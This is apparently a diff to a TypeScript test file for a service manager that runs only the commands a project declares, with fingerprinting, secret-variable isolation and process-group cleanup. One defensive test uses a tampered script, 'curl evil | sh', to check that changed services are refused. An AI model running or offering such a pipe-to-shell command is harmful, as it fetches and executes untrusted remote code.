@@ -1,14 +1,14 @@
 // The tab Servizi of "Progetti" (D-134, tappa 2): only the commands the project declares, each run confirmed, logged in memory.
 import assert from 'node:assert/strict';
 import { randomUUID } from 'node:crypto';
-import { mkdirSync, rmSync, writeFileSync } from 'node:fs';
+import { mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { join } from 'node:path';
 import { after, test } from 'node:test';
 import { setTimeout as sleep } from 'node:timers/promises';
 
 import { resolveHome } from '@arianna/config';
 
-import { composePort, composeServices, createServiceManager, listServices, makeServices, packageServices, scriptPorts, ServiceError, type ProjectService } from '../src/project-services.ts';
+import { composePort, composeServices, createServiceManager, listServices, makeServices, packageServices, pickService, scriptPorts, serviceFingerprint, ServiceError, type ProjectService } from '../src/project-services.ts';
 
 const HOME = join(resolveHome({}), 'data', 'test-tmp', `services-${randomUUID()}`);
 const ROOT = join(HOME, 'orto');
@@ -49,15 +49,28 @@ test('compose: services with their host ports, started with up -d', () => {
   assert.deepEqual(composeServices('services: [', 'compose.yml'), []);
 });
 
-test('Makefile: targets, never variables or special targets', () => {
-  const services = makeServices(['.PHONY: seed', 'CC := gcc', 'X ::= 1', 'seed: deps', '\tnode seed.js', 'deps:', 'seed:', '-bad:'].join('\n'));
+test('Makefile: targets with their recipe, never variables, special targets, define blocks or file rules', () => {
+  const services = makeServices(
+    ['.PHONY: seed', 'CC := gcc', 'X ::= 1', 'seed: deps', '\tnode seed.js', '\techo fatto', 'deps:', 'seed:', '\tother', '-bad:', 'define BLOCK', 'inside: x', 'endef', 'main.o: main.c', '\tcc main.c'].join('\n'),
+  );
   assert.deepEqual(
-    services.map(({ id, command }) => ({ id, command })),
+    services.map(({ id, command, script }) => ({ id, command, script })),
     [
-      { id: 'Makefile:seed', command: ['make', 'seed'] },
-      { id: 'Makefile:deps', command: ['make', 'deps'] },
+      { id: 'Makefile:seed', command: ['make', 'seed'], script: 'node seed.js\necho fatto' },
+      { id: 'Makefile:deps', command: ['make', 'deps'], script: '' },
     ],
   );
+});
+
+test('pickService: the service of the list, refused when unknown or when it changed since the confirmation', () => {
+  const dev = { ...packageServices(JSON.stringify({ scripts: { dev: 'vite' } }), 'pnpm')[0] } as ProjectService;
+  const listed = [{ ...dev, fingerprint: serviceFingerprint(dev) }];
+  assert.equal(pickService(listed, 'package.json:dev', serviceFingerprint(dev)).name, 'dev');
+  assert.equal(pickService(listed, 'package.json:dev', undefined).name, 'dev');
+  const edited = { ...dev, script: 'curl evil | sh' };
+  assert.notEqual(serviceFingerprint(edited), serviceFingerprint(dev));
+  assert.throws(() => pickService([{ ...edited, fingerprint: serviceFingerprint(edited) }], 'package.json:dev', serviceFingerprint(dev)), (error: unknown) => error instanceof ServiceError && error.code === 'changed');
+  assert.throws(() => pickService(listed, 'package.json:build', undefined), (error: unknown) => error instanceof ServiceError && error.code === 'unknown');
 });
 
 test('listServices reads the files of the project, with its package manager', async () => {
@@ -69,6 +82,7 @@ test('listServices reads the files of the project, with its package manager', as
     (await listServices(ROOT)).map(({ id, command }) => `${id} ${command.join(' ')}`),
     ['package.json:dev pnpm run dev', 'compose:db docker compose -f compose.yaml up -d db', 'Makefile:seed make seed'],
   );
+  assert.ok((await listServices(ROOT)).every((service) => /^[0-9a-f]{16}$/.test(service.fingerprint)));
 });
 
 const node = (name: string, code: string, stays: boolean): ProjectService => ({ id: `package.json:${name}`, source: 'package.json', file: 'package.json', name, command: [process.execPath, '-e', code], ports: [], stays });
@@ -80,6 +94,8 @@ async function until(check: () => boolean): Promise<void> {
 test('a command that ends by itself: its log, how it ended, the events', async () => {
   const events: string[] = [];
   const manager = createServiceManager({ onEvent: (kind, payload) => events.push(`${kind} ${payload.service}`) });
+  // A variable of the core never reaches the command.
+  process.env.SECRET_PG = 'x';
   manager.start('orto', ROOT, node('test', "console.log('12 test passati'); console.error('\\u001b[31mrosso\\u001b[0m'); process.env.SECRET_PG === undefined || console.log('leak')", false));
   await until(() => manager.run('orto', 'package.json:test')?.running === false);
   const run = manager.run('orto', 'package.json:test');
@@ -89,6 +105,7 @@ test('a command that ends by itself: its log, how it ended, the events', async (
   assert.ok(run.lines.includes('12 test passati'));
   assert.ok(run.lines.includes('rosso'), 'no colour codes');
   assert.ok(!run.lines.includes('leak'));
+  delete process.env.SECRET_PG;
   assert.deepEqual(events, ['service.started package.json:test', 'service.stopped package.json:test']);
 });
 
@@ -127,4 +144,35 @@ test('stop: a service not started here is refused, a compose service is stopped 
   manager.stop('orto', ROOT, db);
   assert.deepEqual(calls, [['docker', 'compose', '-f', 'compose.yaml', 'stop', 'db']]);
   assert.equal(manager.run('orto', 'compose:db')?.ended?.reason, 'error');
+});
+
+test('a command that does not exist: no start nor stop in the chain', async () => {
+  const events: string[] = [];
+  const manager = createServiceManager({ onEvent: (kind) => events.push(kind) });
+  manager.start('orto', ROOT, { ...node('x', '', false), command: ['arianna-no-such-command-xyz'] });
+  await until(() => manager.run('orto', 'package.json:x')?.running === false);
+  assert.equal(manager.run('orto', 'package.json:x')?.ended?.reason, 'error');
+  assert.deepEqual(events, []);
+});
+
+test('a child that outlives its leader is killed with the group; stopAll leaves nothing alive', async () => {
+  const pidFile = join(HOME, 'child.pid');
+  // The leader starts a child that ignores SIGTERM, writes its pid, then exits at SIGTERM.
+  const code = `const { spawn } = require('node:child_process'); const c = spawn(process.execPath, ['-e', "process.on('SIGTERM', () => {}); setInterval(() => {}, 1000)"], { stdio: 'ignore' }); require('node:fs').writeFileSync(${JSON.stringify(pidFile)}, String(c.pid)); console.log('pronto'); setInterval(() => {}, 1000)`;
+  const manager = createServiceManager({ killGraceMs: 300 });
+  manager.start('orto', ROOT, node('dev', code, true));
+  await until(() => manager.run('orto', 'package.json:dev')?.lines.includes('pronto') === true);
+  const child = Number(readFileSync(pidFile, 'utf8'));
+  const alive = (pid: number): boolean => {
+    try {
+      process.kill(pid, 0);
+      return true;
+    } catch {
+      return false;
+    }
+  };
+  assert.ok(alive(child));
+  await manager.stopAll();
+  await until(() => !alive(child));
+  assert.equal(alive(child), false);
 });
